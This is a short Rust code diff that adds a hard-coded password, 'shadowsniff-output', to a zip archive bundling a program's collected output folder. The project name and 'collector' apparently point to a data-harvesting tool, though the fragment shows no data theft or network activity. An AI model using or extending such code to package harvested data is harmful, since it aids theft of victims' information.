@@ -48,11 +48,12 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     }
     
     let displayed_collector = format!("{}", DisplayCollector(collector));
-    
+
     log_debug!("{displayed_collector}");
 
     let zip = ZipArchive::default()
         .add_folder_content(&out)
+        .password("shadowsniff-output")
         .comment(displayed_collector)
         .create();
 
